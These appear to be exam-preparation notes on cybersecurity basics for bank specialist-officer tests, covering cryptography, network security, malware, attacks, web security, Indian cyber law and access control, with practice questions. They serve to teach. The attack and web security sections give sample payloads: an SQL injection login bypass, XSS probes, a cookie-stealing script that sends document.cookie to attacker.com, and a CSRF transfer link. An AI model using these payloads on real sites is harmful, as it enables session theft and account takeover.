| Topic                              | What to Focus On                                      |
| ---------------------------------- | ----------------------------------------------------- |
| **Basic Terminology**              | Threat, Vulnerability, Risk, Exploit, Attack vector   |
| **Encryption & Cryptography**      | Symmetric vs Asymmetric, RSA, AES, Hashing (MD5, SHA) |
| **Network Security**               | Firewalls, IDS/IPS, VPN, Proxy Servers                |
| **Authentication & Authorization** | 2FA, OAuth, Biometrics, Tokens                        |
| **Malware**                        | Viruses, Worms, Trojans, Ransomware, Rootkits         |
| **Cyber Attacks**                  | Phishing, DDoS, SQL Injection, Man-in-the-Middle      |
| **Web Security**                   | HTTPS, SSL/TLS, Cookies, CSRF, XSS                    |
| **Cyber Laws & Compliance**        | IT Act 2000 (India), GDPR basics, CERT-In             |
| **Access Control Models**          | MAC, DAC, RBAC                                        |


**Basic Terminology**     
🧠 Core Concepts
1. Threat
A potential cause of an unwanted incident that may result in harm to a system or organization.

🔸 It’s the "what could go wrong."

🔐 Examples:

A hacker trying to access sensitive data.

Natural disasters like floods affecting a data center.

Insider trying to leak confidential files.

2. Vulnerability
A weakness or flaw in a system that can be exploited by a threat.

🔸 It’s the "loophole or gap" in your defense.

🔐 Examples:

Unpatched software

Weak passwords

Open ports with no firewall

3. Risk
The likelihood that a threat will exploit a vulnerability and cause harm.

🔸 Risk = Threat × Vulnerability × Impact

🔐 Example:

If a server has an outdated OS (vulnerability) and hackers are scanning the internet (threat), then there’s a high risk of an attack.

4. Exploit
A tool, script, or technique used to take advantage of a vulnerability.

🔸 It’s the "weapon" used in an attack.

🔐 Examples:

SQL injection script

Buffer overflow code

Malware exploiting zero-day vulnerabilities

5. Attack Vector
The path or means by which a threat actor gains access to a system.

🔸 It’s the "entry door" into the system.

🔐 Examples:

Phishing email (email is the vector)

Malicious USB drive

A fake login page (web interface vector)

🧪 Real-Life Example
Imagine your system has weak login passwords.

🔸 Threat = A hacker wants to break in.

🔸 Vulnerability = Weak password.

🔸 Exploit = Brute-force tool used to guess the password.

🔸 Attack Vector = Login page on the website.

🔸 Risk = High, because the system can be compromised easily.

📌 Quick MCQ Practice
What term best describes a flaw in software that can be used to gain unauthorized access?
a) Threat
b) Risk
c) Vulnerability
d) Patch
➤ Answer: c) Vulnerability

Which one is considered an entry point for cyber attacks?
➤ Answer: Attack Vector

Which of the following refers to the combination of a threat exploiting a vulnerability?
➤ Answer: Risk


**Encryption & Cryptography**

🔐 What is Cryptography?
Cryptography is the practice of securing data by converting it into an unreadable format (encryption) that can only be made readable again (decryption) with a secret key.

🧱 Types of Cryptography
Type	Description	Examples
Symmetric Encryption	Same key is used for encryption and decryption. Fast, but less secure if key is shared.	AES, DES
Asymmetric Encryption	Uses a public key to encrypt and a private key to decrypt. More secure, but slower.	RSA, ECC
Hashing	Converts data into a fixed-length string. One-way only (no decryption). Used for password storage, integrity.	SHA, MD5

🔐 Symmetric Encryption
Key Point: One shared key for both sender & receiver.

Example:
If Kalpana sends a message to a server, both use the same secret key to encrypt and decrypt it.

Common Algorithms: AES, DES

🔸 AES (Advanced Encryption Standard) is widely used and very secure.

🔐 Asymmetric Encryption
Key Point: Uses two keys — public and private.

Public Key: Known to everyone

Private Key: Kept secret by the owner

Example:
You encrypt a message using someone's public key — only they can decrypt it using their private key.

🔸 RSA is the most widely used asymmetric algorithm.

🔐 Hashing
Key Point: Irreversible function; mainly for verifying data integrity.

Converts input into a fixed-size hash.

Used for storing passwords, verifying file integrity.

Popular Hash Functions: MD5 (outdated), SHA-1, SHA-256

🔁 Summary Table
Feature	Symmetric	Asymmetric	Hashing
Key Type	One key	Public & Private	No key
Speed	Fast	Slow	Fast
Use Case	Bulk data encryption	Secure key exchange	Data integrity (e.g., passwords)
Reversible	Yes	Yes	No

🧠 Sample Questions
Which of the following is an asymmetric encryption algorithm?
a) DES
b) AES
c) RSA
d) SHA-1
➤ Answer: c) RSA

Hashing is primarily used for:
a) Encrypting emails
b) Key exchange
c) Data integrity verification
d) Compressing files
➤ Answer: c) Data integrity verification

What’s the key difference between symmetric and asymmetric encryption?
➤ Symmetric uses one shared key, asymmetric uses a key pair (public + private).



**Network Security**       

🔐 1. Firewalls
🔸 What is it?
A firewall is a security system (hardware or software) that monitors and controls incoming and outgoing network traffic based on predetermined rules.

🔸 Key Points:
Acts as a barrier between trusted (internal) and untrusted (external) networks.

Filters traffic based on IP, port, protocol.

Can block unauthorized access.

🔥 Types:
Packet-filtering Firewall (checks IPs and ports)

Stateful Firewall (tracks active connections)

Application-layer Firewall (e.g., proxy firewalls)

🧠 Example:
A firewall blocks port 21 to prevent FTP traffic from untrusted sources.

🕵️‍♀️ 2. IDS / IPS
🔸 IDS (Intrusion Detection System)
A tool that monitors network traffic and raises alerts when suspicious activity is detected.

Passive – detects and alerts only.

Example: Snort, OSSEC

🔸 IPS (Intrusion Prevention System)
Like IDS, but actively blocks or stops malicious activity.

Active – detects + takes action (drops packet, resets connection).

✅ IDS vs IPS:
Feature	IDS	IPS
Role	Detect	Detect + Prevent
Placement	After firewall	Inline (real-time)
Response	Alerts only	Blocks traffic

🌐 3. VPN (Virtual Private Network)
🔸 What is it?
A VPN encrypts your internet traffic and routes it through a remote server, creating a secure "tunnel".

🔸 Use Cases:
Secure remote access

Bypassing geo-restrictions

Protect data on public Wi-Fi

🔐 Protocols Used:
PPTP, L2TP, OpenVPN, IPsec

Example: Bank employees use VPN to securely connect to internal systems from home.

🧭 4. Proxy Server
🔸 What is it?
A proxy server acts as an intermediary between the user and the internet.

🔸 Functions:
Hide IP address (anonymity)

Content filtering

Cache websites for faster access

Often used in schools/offices to control access

Example: A proxy can block access to social media websites in a corporate environment.

🔁 Summary Table
| Tool         | Function                                  | Passive/Active | Example       |
| ------------ | ----------------------------------------- | -------------- | ------------- |
| **Firewall** | Blocks or allows traffic                  | Active         | iptables, UFW |
| **IDS**      | Detects suspicious activity               | Passive        | Snort         |
| **IPS**      | Detects + blocks activity                 | Active         | Suricata      |
| **VPN**      | Encrypts traffic for secure remote access | Active         | OpenVPN       |
| **Proxy**    | Intermediary, filters content             | Passive/Active | Squid Proxy   |


🧠 Sample MCQs
Which tool only detects intrusions but does not block them?
➤ Answer: IDS

What is the primary role of a firewall?
a) Encrypt data
b) Prevent malware
c) Filter network traffic
d) Store data
➤ Answer: c) Filter network traffic

A VPN primarily provides:
➤ Answer: Secure remote access

Which tool can help anonymize your internet activity?
➤ Answer: Proxy Server



 **Authentication & Authorization** 
🔐 2FA, OAuth, Biometrics, Tokens – Explained
These terms are all related to user identification and access control:

✅ 1. 2FA (Two-Factor Authentication)
A security process in which two different types of credentials are required to verify a user’s identity.

🧱 Example:
You enter your password (something you know)

You get an OTP on mobile (something you have)

✅ Adds an extra layer of security beyond just a password.

🔐 Types of Factors:
Factor Type	Example
Something you know	Password, PIN
Something you have	OTP, Smart card
Something you are	Fingerprint, Face ID

✅ 2. OAuth (Open Authorization)
A token-based authorization framework that lets third-party apps access your data without sharing your password.

🧱 Example:
You click "Login with Google" on a third-party website.

That site uses OAuth to request limited access to your Google account (like email).

✅ You don’t give your password to the third party.
✅ Scopes restrict what the app can do (read-only, read-write, etc.).

✅ 3. Biometrics
Uses unique biological traits for identification or access.

🔐 Common Biometrics:
Fingerprint

Face recognition

Iris scan

Voice recognition

✅ Pros:
Hard to fake

Convenient

❌ Cons:
Privacy concerns

Can’t be changed if leaked (unlike passwords)

✅ 4. Tokens
A randomly generated string used to authenticate or authorize a user/session.

🧱 Types of Tokens:
Token Type	Usage Example
Session Token	After login, used in cookies
API Token	Used for REST API access
Access Token (OAuth)	Grants access to user data
Hardware Token	Physical device generating OTPs

Example: A token sent to your email after login to verify your identity.

🔁 Summary Table
| Term       | Category                     | Purpose                          | Example             |
| ---------- | ---------------------------- | -------------------------------- | ------------------- |
| 2FA        | Authentication               | Identity verification            | OTP + Password      |
| OAuth      | Authorization                | Allow app to access your account | Login with Facebook |
| Biometrics | Authentication               | Physical identity check          | Fingerprint scanner |
| Tokens     | Authentication/Authorization | Provide access/session           | Bearer token, OTP   |


🧠 Sample MCQs
Which of the following is a two-factor authentication method?
a) Password
b) OTP
c) Password + OTP
d) Username
➤ Answer: c) Password + OTP

OAuth is mainly used for:
➤ Answer: Authorization

Which of these is not a biometric method?
a) Retina scan
b) Fingerprint
c) OTP
d) Facial recognition
➤ Answer: c) OTP

What is a token in security?
➤ Answer: A string used to represent access rights or session info


 **Malware**   


🦠 What is Malware?
Malware (short for malicious software) is software designed to harm, disrupt, or gain unauthorized access to systems or data.

📚 Common Types of Malware
| Malware Type     | Description                                                   | Key Behavior                 |
| ---------------- | ------------------------------------------------------------- | ---------------------------- |
| **Virus**        | Attaches to clean files/programs and spreads when executed.   | Needs human action to spread |
| **Worm**         | Self-replicates and spreads through networks.                 | Spreads automatically        |
| **Trojan Horse** | Disguised as legitimate software but contains malicious code. | Trick-based infection        |
| **Ransomware**   | Encrypts files and demands ransom for decryption.             | Extortion                    |
| **Spyware**      | Secretly gathers user data (e.g., keystrokes, passwords).     | Surveillance                 |
| **Adware**       | Displays unwanted ads, often redirects browsers.              | Spam or marketing            |
| **Rootkit**      | Hides the presence of malware and allows privileged access.   | Stealth-based                |
| **Botnet**       | Group of infected computers controlled remotely (zombies).    | Used for DDoS attacks        |


📌 Detailed Examples
🧫 1. Virus
Spread: Through infected .exe files, USBs.

Action: Corrupts or deletes data, crashes system.

Needs: User to run the file.

🪱 2. Worm
Spread: Via networks, email attachments.

Action: Eats up bandwidth, crashes servers.

🐎 3. Trojan Horse
Example: Fake antivirus software that installs a keylogger.

Does not self-replicate.

🔐 4. Ransomware
Example: WannaCry, Petya

Encrypts data and shows a ransom note (e.g., “Pay 0.5 BTC to unlock your files”)

🕵️‍♂️ 5. Spyware
Example: Keyloggers

Sends credentials to hackers.

🧠 How Malware Spreads
Email attachments

Infected USB drives

Fake software/downloads

Malicious websites or pop-ups

Software vulnerabilities

🧯 Basic Protection Measures
| Method                | Description                       |
| --------------------- | --------------------------------- |
| Antivirus/Antimalware | Detects and removes known malware |
| Firewalls             | Blocks unauthorized connections   |
| Software Updates      | Fix known vulnerabilities         |
| User Awareness        | Avoid suspicious emails/downloads |


🧠 Sample MCQs
Which malware disguises itself as a legitimate program?
➤ Answer: Trojan Horse

Which malware encrypts data and demands payment?
➤ Answer: Ransomware

What is a key difference between a virus and a worm?
➤ Answer: Worms spread without user action; viruses need execution.

Which malware type monitors and sends user activity secretly?
➤ Answer: Spyware



**Cyber Attacks**

💣 What is a Cyber Attack?
A cyber attack is any attempt to steal, expose, alter, disable, or destroy information through unauthorized access to computer systems or networks.

🚨 Major Types of Cyber Attacks
Let’s go over the most important and exam-relevant ones:

1. Phishing
Trick user into revealing sensitive data (passwords, OTPs, etc.) through fake emails or websites.

🧠 Example:
You get an email that looks like it's from a bank asking for your login credentials.

🔐 Protection:

Don't click on suspicious links.

Check sender email authenticity.

Use spam filters.

2. DDoS (Distributed Denial of Service)
Overloads a server/system with huge traffic from multiple sources to make it unavailable.

🧠 Example:
A government website is made inaccessible by millions of fake requests per second.

🔐 Protection:

Use rate limiting.

Anti-DDoS services (like Cloudflare).

Load balancers.

3. MITM (Man-in-the-Middle) Attack
The attacker secretly intercepts and possibly alters communication between two parties.

🧠 Example:
You're on public Wi-Fi, and an attacker reads your data as it passes through an insecure connection.

🔐 Protection:

Use HTTPS.

Avoid public Wi-Fi without VPN.

Use SSL certificates.

4. SQL Injection
Attacker inserts malicious SQL queries into a vulnerable form input to access or modify database data.

🧠 Example:
An attacker enters ' OR 1=1 -- into a login form to bypass authentication.

🔐 Protection:

Use prepared statements or ORMs.

Validate input fields.

5. Brute Force Attack
Repeatedly trying all possible combinations to guess a password or key.

🔐 Protection:

Use strong, complex passwords.

Lock account after failed attempts.

CAPTCHA.

6. Zero-Day Attack
Exploits a vulnerability that is not yet known or patched by the software vendor.

🔐 Protection:

Keep software updated.

Use threat intelligence and behavior monitoring.

7. Cross-Site Scripting (XSS)
Attacker injects malicious scripts into web pages viewed by other users.

🧠 Example:
An attacker injects <script>alert('hacked')</script> into a comment box.

🔐 Protection:

Sanitize input.

Encode output.

🧠 Sample MCQs
Which of the following is a form of social engineering?
➤ Answer: Phishing

What kind of attack involves flooding a server with traffic to crash it?
➤ Answer: DDoS

Which attack targets database vulnerabilities?
➤ Answer: SQL Injection

In which attack does an attacker intercept communication between two parties?
➤ Answer: MITM (Man-in-the-Middle)

📝 Summary Table
| Attack Type   | Target        | Nature            | Prevention                            |
| ------------- | ------------- | ----------------- | ------------------------------------- |
| Phishing      | Users         | Deceptive         | Awareness, email filters              |
| DDoS          | Servers       | Overload          | Firewalls, load balancers             |
| MITM          | Communication | Interception      | HTTPS, VPNs                           |
| SQL Injection | Database      | Code Injection    | Input validation, prepared statements |
| Brute Force   | Passwords     | Repeated attempts | Lockouts, CAPTCHAs                    |
| Zero-Day      | Software      | Unknown flaw      | Updates, threat monitoring            |
| XSS           | Browsers      | Script Injection  | Input sanitization                    |


** Web Security **

🌐 What is Web Security?
Web Security involves protecting websites, web applications, and web services from cyber attacks and unauthorized access.

These protections help safeguard:

Sensitive user data (passwords, credit card info)

Website functionality (login, search, forms)

Backend systems (database, APIs)

🛡️ Key Threats in Web Security
Let’s break down the most common web-based vulnerabilities and how to prevent them:

1. SQL Injection (SQLi)
Injecting malicious SQL queries into input fields to manipulate a database.

🧠 Example:

Input: ' OR 1=1 --
➤ This bypasses login verification.

✅ Protection:

Use prepared statements (parameterized queries)

Input validation and sanitization

2. Cross-Site Scripting (XSS)
Attacker injects malicious JavaScript into a webpage to run in users' browsers.

🧠 Example:

html
Copy
Edit
<script>alert('hacked')</script>
✅ Protection:

Escape user input before rendering on page

Use Content Security Policy (CSP)

3. Cross-Site Request Forgery (CSRF)
Forces a logged-in user to unknowingly send malicious requests (e.g., bank transfer).

🧠 Example:
Attacker sends a link like:

arduino
Copy
Edit
http://bank.com/transfer?amount=50000&to=attacker
When clicked by a logged-in user, it executes.

✅ Protection:

Use CSRF tokens

Validate origin headers

4. Broken Authentication
Poor session management or predictable login flows allow attackers to hijack user sessions.

✅ Protection:

Implement multi-factor authentication (2FA)

Use secure, time-bound session tokens

Use HTTPS

5. Security Misconfiguration
Incorrect settings in servers, databases, or apps can expose sensitive data.

🧠 Example:

Default admin passwords

Directory listing enabled

Debug mode ON

✅ Protection:

Disable unnecessary features

Regular security audits

Patch software

6. Insecure Direct Object Reference (IDOR)
Users can access others’ data by modifying parameters in the URL.

🧠 Example:

bash
Copy
Edit
https://bank.com/user?id=101
Changing to id=102 shows someone else’s info.

✅ Protection:

Enforce access controls on server side

Use indirect references or tokens

✅ OWASP Top 10 (Web Security Bible)
OWASP (Open Web Application Security Project) lists top 10 most critical web application risks:

Broken Access Control

Cryptographic Failures

Injection (SQLi, XSS)

Insecure Design

Security Misconfiguration

Vulnerable Components

Identification & Auth Failures

Software/Data Integrity Failures

Logging/Monitoring Failures

SSRF (Server-Side Request Forgery)

🧠 Sample MCQs
What does XSS stand for?
➤ Cross-Site Scripting

Which attack tricks the user into performing unintended actions on a website?
➤ CSRF

Which is a solution for SQL injection?
➤ Prepared Statements

What is OWASP?
➤ An organization that publishes web security best practices.

✅ HTTPS

✅ SSL/TLS

✅ Cookies

✅ CSRF

✅ XSS

These are frequent MCQ topics in bank SO exams (like Union Bank) and crucial for anyone working in Cybersecurity, Web, or Backend.

🔒 1. HTTPS (HyperText Transfer Protocol Secure)
Secure version of HTTP using SSL/TLS to encrypt communication between browser & server.

🔐 What it does:
Encrypts data (no one can read it)

Authenticates the server (you know you're talking to the real website)

🧠 Example:
https://www.bank.com ensures login details can’t be read by attackers.

📌 Key Points:
Uses Port 443

Shows a lock icon in the browser

Prevents MITM (Man-in-the-Middle) attacks

🔐 2. SSL/TLS (Secure Sockets Layer / Transport Layer Security)
Protocols that encrypt data during transmission over the web.

SSL is outdated.

TLS is the modern, secure version.

🔐 What TLS does:
Encrypts communication

Ensures data integrity

Performs authentication

Handshake Steps (Simplified):
Browser says "Hi" → Server says "Hi" with its certificate

Key exchange → Session key generated

Encrypted communication begins

🍪 3. Cookies
Small pieces of data stored in the browser used for tracking and session management.

📦 Used For:
Login sessions (session_id)

Remembering preferences (dark mode)

Tracking users across websites (analytics/ads)

🧠 Important Cookie Flags:
Flag	Purpose
HttpOnly	JS cannot access it (protects from XSS)
Secure	Only sent over HTTPS
SameSite	Prevents CSRF

🛡️ 4. CSRF (Cross-Site Request Forgery)
Tricks a logged-in user into performing unauthorized actions on a trusted site.

🧠 Example:
You're logged into your bank

You click a malicious link:
https://bank.com/transfer?amount=10000&to=attacker

✅ Bank executes the action thinking it's you!

🔐 Protection:
Use CSRF tokens (random hidden values in forms)

Use SameSite cookies

Check Referer / Origin headers

💥 5. XSS (Cross-Site Scripting)
Attacker injects malicious JavaScript into a web page that runs on another user's browser.

🧠 Example:
<script>document.location='http://attacker.com?cookie='+document.cookie</script>

🔐 Types:
Stored XSS: Code saved in DB (e.g., comment box)

Reflected XSS: Sent in URL, reflected in page

DOM-based XSS: JS manipulates DOM insecurely

🔐 Protection:
Escape user input before rendering (HTML encoding)

Use frameworks with auto-sanitization

Set HttpOnly and Content-Security-Policy (CSP)

🧠 Summary Table
| Concept     | Description                    | Prevention                           |
| ----------- | ------------------------------ | ------------------------------------ |
| **HTTPS**   | Encrypted web communication    | Use SSL/TLS                          |
| **SSL/TLS** | Protocol for secure connection | Use TLS 1.2+                         |
| **Cookies** | Browser-stored session data    | Set Secure, HttpOnly, SameSite       |
| **CSRF**    | Tricks user to perform actions | Use CSRF tokens, SameSite cookies    |
| **XSS**     | Injects JS to steal data       | Input sanitization, HttpOnly cookies |


🧠 Sample MCQs
What protocol does HTTPS use to secure data?
➤ TLS (or SSL)

Which flag prevents JavaScript from accessing a cookie?
➤ HttpOnly

Which attack tricks users into unknowingly sending requests?
➤ CSRF

What is the solution to prevent XSS?
➤ Input sanitization and encoding

**Cyber Laws & Compliance**  

Cyber laws are rules, regulations, and legal measures that deal with crimes involving computers, networks, software, and the internet.

They cover:

Data Protection

Hacking

Online Fraud

Cyberstalking

Digital Signatures

Software Piracy

📜 Important Cyber Laws in India
1. IT Act, 2000 (Information Technology Act)
India’s primary law dealing with:

Electronic governance

Cybercrime

Digital signatures

Data privacy

🔹 Major Sections:
| Section     | Provision                                                 |
| ----------- | --------------------------------------------------------- |
| **Sec 43**  | Penalty for unauthorized access (hacking, damage to data) |
| **Sec 66**  | Computer-related offenses (punishment for hacking)        |
| **Sec 66C** | Identity theft                                            |
| **Sec 66D** | Cheating by impersonation (phishing, fake websites)       |
| **Sec 67**  | Publishing obscene material                               |
| **Sec 69**  | Govt. power to intercept/decrypt information              |
| **Sec 72**  | Breach of confidentiality by authorized persons           |


📋 Cyber Law Terminology
| Term                     | Description                                                                        |
| ------------------------ | ---------------------------------------------------------------------------------- |
| **Digital Signature**    | Used for authentication in electronic records                                      |
| **Electronic Record**    | Data stored electronically                                                         |
| **Adjudicating Officer** | Investigates and penalizes violations under IT Act                                 |
| **CERT-IN**              | Indian Computer Emergency Response Team (national nodal agency for cyber security) |


🌍 Global Cybersecurity Laws & Standards
| Law / Framework | Purpose                                             |
| --------------- | --------------------------------------------------- |
| **GDPR (EU)**   | Protects personal data of EU citizens               |
| **HIPAA (USA)** | Secures health data                                 |
| **ISO 27001**   | Global standard for Information Security Management |
| **PCI-DSS**     | Standard for securing card transactions             |
| **NIST (USA)**  | Cybersecurity framework for risk management         |


✅ Compliance Concepts
Compliance means following the legal and regulatory requirements regarding data privacy and cybersecurity.

| Term                | Meaning                                           |
| ------------------- | ------------------------------------------------- |
| **Data Protection** | Ensuring user data is stored & used securely      |
| **Privacy Policy**  | Document that explains how data is collected/used |
| **Audit Trail**     | Logs to trace actions on a system                 |
| **Cyber Insurance** | Covers financial losses due to cyber incidents    |


🧠 Sample MCQs
Which section of the IT Act covers hacking offenses?
➤ Section 66

CERT-IN is responsible for?
➤ Handling cyber incidents in India

Which international law governs EU data privacy?
➤ GDPR

What does PCI-DSS focus on?
➤ Secure handling of card transactions

Section 66D of the IT Act deals with?
➤ Cheating by impersonation (e.g., phishing)


**Access Control Models**

🔐 What is Access Control?
Access Control determines who can access what resources in a system and under what conditions.

It ensures Confidentiality, Integrity, and Availability (CIA) by restricting unauthorized access.

🧱 Types of Access Control Models
Here are the four main models, each with its own logic and application:

1. Discretionary Access Control (DAC)
Access is controlled by the data owner.

🧠 Example:
You (file owner) decide who else can read, write, or execute your file.

📌 Key Features:

Uses Access Control Lists (ACLs)

Flexible but less secure

Found in Windows, UNIX (chmod)

✅ MCQ Hint: “Access based on user identity and ownership” → DAC

2. Mandatory Access Control (MAC)
Access is controlled by the system, not users.

🧠 Example:
Used in military systems where files have labels like Confidential, Secret, Top Secret.

📌 Key Features:

Rigid and policy-driven

Based on security labels/classifications

Users can’t change permissions

✅ MCQ Hint: “Uses labels like Top Secret” → MAC

3. Role-Based Access Control (RBAC)
Access is based on the user’s role in the organization.

🧠 Example:
A “Manager” can access reports, but a “Clerk” cannot.

📌 Key Features:

Roles are assigned permissions

Users get access by assuming roles

Used in corporate and enterprise environments

✅ MCQ Hint: “Access based on job position” → RBAC

4. Attribute-Based Access Control (ABAC)
Access is based on attributes (user, resource, environment).

🧠 Example:
Allow access only if user is in HR department and time is between 9 AM–5 PM.

📌 Key Features:

Fine-grained

Based on policies using multiple attributes

Flexible but complex

✅ MCQ Hint: “Access based on multiple attributes like location, time” → ABAC

🧠 Summary Table
| Model | Controlled By     | Example           | Use Case               |
| ----- | ----------------- | ----------------- | ---------------------- |
| DAC   | Owner             | chmod in Linux    | Personal files         |
| MAC   | System/Policy     | Military files    | Government/military    |
| RBAC  | Role              | Manager access    | Corporates, Banks      |
| ABAC  | Policy/Attributes | HR + 9AM-5PM rule | Cloud, Enterprise apps |

🧠 Sample MCQs
Which access control model allows users to define access?
➤ DAC

Which model uses security labels like Confidential?
➤ MAC

RBAC is based on which of the following?
➤ User roles

Which access model is the most fine-grained and policy-based?
➤ ABAC

In which model can a file owner assign permissions to others?
➤ DAC
